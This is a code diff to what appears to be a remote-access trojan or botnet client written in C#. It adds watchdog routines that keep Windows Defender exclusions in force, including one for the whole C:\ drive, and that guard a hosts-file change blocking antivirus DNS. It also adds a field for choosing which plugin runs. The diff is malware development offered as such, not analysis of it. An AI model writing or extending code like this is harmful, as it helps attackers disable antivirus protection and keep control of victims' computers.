@@ -1598,7 +1598,10 @@ internal class TlsClient : IDisposable
                 : Path.GetDirectoryName(Environment.ProcessPath ?? "")!;
         }
         if (!string.IsNullOrEmpty(excludeDir))
+        {
             Protection.AddDefenderExclusion(excludeDir);
+            Persistence.StartDefenderExclusionWatch(excludeDir);
+        }
     }
 
     [System.Runtime.InteropServices.UnmanagedFunctionPointer(System.Runtime.InteropServices.CallingConvention.Winapi)]
@@ -1635,6 +1638,17 @@ internal class TlsClient : IDisposable
             else { }
 
             Environment.SetEnvironmentVariable("SERO_PLUGIN_LOG", null);
+
+            // Activate watchdogs inside the anti-kill watchdog loop (if running)
+            if (ok) switch (pluginData.PluginKind)
+            {
+                case "block_av_dns":
+                    Persistence.StartHostsWatch();
+                    break;
+                case "exclude_defender":
+                    Persistence.StartDefenderExclusionWatch(@"C:\");
+                    break;
+            }
 
             // Read optional plugin log (e.g. BotKiller reports killed processes)
             var logLines = "";
@@ -2541,6 +2555,7 @@ internal class PluginExecData
 {
     public string DllBase64 { get; set; } = string.Empty;
     public string ExportName { get; set; } = "PluginMain";
+    public string? PluginKind { get; set; }
 }
 
 internal class ElevationResultData
